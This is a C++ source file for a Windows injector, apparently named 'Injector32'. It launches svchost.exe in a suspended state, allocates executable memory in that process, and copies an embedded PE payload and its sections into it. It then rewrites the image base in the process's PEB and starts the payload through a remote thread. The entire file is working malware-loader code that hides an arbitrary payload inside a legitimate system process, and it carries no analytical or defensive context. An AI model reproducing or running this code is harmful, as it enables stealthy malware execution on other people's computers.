#include <iostream>
#include <Windows.h>
#include <strsafe.h>

#include "hdr/shellcode.h"
#include "hdr/logger.h"

// convert GetLastError to string for diagnostics
static std::string GetLastErrorString(DWORD err = GetLastError()) {
    LPSTR msg = nullptr;
    FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM |
                   FORMAT_MESSAGE_IGNORE_INSERTS, nullptr, err,
                   MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&msg, 0, nullptr);
    std::string s = msg ? msg : "";
    LocalFree(msg);
    return s;
}

// simple RAII wrapper for HANDLE
struct Handle {
    HANDLE h;
    explicit Handle(HANDLE h_ = nullptr) : h(h_) {}
    ~Handle() { if (h && h != INVALID_HANDLE_VALUE) CloseHandle(h); }
    operator HANDLE() const { return h; }
};

int wmain(int /*argc*/, wchar_t* /*argv*/[]) {
    Logger::Init("Injector32",
                 FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY,
                 FOREGROUND_GREEN | FOREGROUND_BLUE,
                 FOREGROUND_GREEN | FOREGROUND_INTENSITY,
                 FOREGROUND_RED,
                 FOREGROUND_RED | FOREGROUND_GREEN);
    LOG_INFO("shellcode size = %zu bytes", rawDataSize);

    PIMAGE_DOS_HEADER DosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(rawData);
    if (DosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        LOG_ERROR("invalid DOS signature");
        return 1;
    }
    PIMAGE_NT_HEADERS NtHeader = reinterpret_cast<PIMAGE_NT_HEADERS>(rawData + DosHeader->e_lfanew);
    if (NtHeader->Signature != IMAGE_NT_SIGNATURE) {
        LOG_ERROR("invalid NT signature");
        return 1;
    }

    STARTUPINFOW si{}; si.cb = sizeof(si);
    PROCESS_INFORMATION pi{};
    if (!CreateProcessW(L"C:\\Windows\\System32\\svchost.exe",
                        nullptr, nullptr, nullptr, FALSE,
                        CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {
        LOG_ERROR("CreateProcess failed: %s", GetLastErrorString().c_str());
        return 1;
    }
    Handle proc(pi.hProcess);
    Handle thread(pi.hThread);

    HMODULE ntDll = LoadLibraryW(L"ntdll.dll");
    if (!ntDll) {
        LOG_ERROR("LoadLibrary(ntdll) failed: %s", GetLastErrorString().c_str());
        return 1;
    }
    auto NtQueryInformationProcess = reinterpret_cast<NTQUERYINFOPROC>(
        GetProcAddress(ntDll, "NtQueryInformationProcess"));
    if (!NtQueryInformationProcess) {
        LOG_ERROR("NtQueryInformationProcess missing");
        return 1;
    }
    PROCESS_BASIC_INFORMATION pbi{};
    ULONG retlen{};
    NTSTATUS status = NtQueryInformationProcess(proc, ProcessBasicInformation, &pbi, sizeof(pbi), &retlen);
    if (status != 0) {
        LOG_ERROR("NtQueryInformationProcess failed: 0x%08x", status);
        return 1;
    }

    LPVOID base = VirtualAllocEx(proc, nullptr, NtHeader->OptionalHeader.SizeOfImage,
                                 MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!base) {
        LOG_ERROR("VirtualAllocEx failed: %s", GetLastErrorString().c_str());
        return 1;
    }
    if (!WriteProcessMemory(proc, base, rawData, NtHeader->OptionalHeader.SizeOfHeaders, nullptr)) {
        LOG_ERROR("WriteProcessMemory headers failed: %s", GetLastErrorString().c_str());
        return 1;
    }
    auto sect = reinterpret_cast<PIMAGE_SECTION_HEADER>(rawData + DosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS));
    for (WORD i = 0; i < NtHeader->FileHeader.NumberOfSections; ++i, ++sect) {
        LPVOID dest = static_cast<BYTE*>(base) + sect->VirtualAddress;
        LPVOID src = rawData + sect->PointerToRawData;
        if (!WriteProcessMemory(proc, dest, src, sect->SizeOfRawData, nullptr)) {
            LOG_WARNING("writing section %s failed: %s", sect->Name, GetLastErrorString().c_str());
        }
    }

    ULONG pebOffset = offsetof(PEB, Reserved3[1]);
    ULONG_PTR imageBaseField = reinterpret_cast<ULONG_PTR>(pbi.PebBaseAddress) + pebOffset;
    if (!WriteProcessMemory(proc, reinterpret_cast<LPVOID>(imageBaseField), &base, sizeof(base), nullptr)) {
        LOG_WARNING("PEB update failed");
    }

    LPTHREAD_START_ROUTINE entry = reinterpret_cast<LPTHREAD_START_ROUTINE>(
        static_cast<BYTE*>(base) + NtHeader->OptionalHeader.AddressOfEntryPoint);
    Handle remote(CreateRemoteThread(proc, nullptr, 0, entry, nullptr, CREATE_SUSPENDED, nullptr));
    if (!remote) {
        LOG_ERROR("CreateRemoteThread failed: %s", GetLastErrorString().c_str());
        return 1;
    }

    ResumeThread(remote);
    ResumeThread(thread);

    LOG_SUCCESS("32-bit injection complete");
    FreeLibrary(ntDll);
    return 0;
}
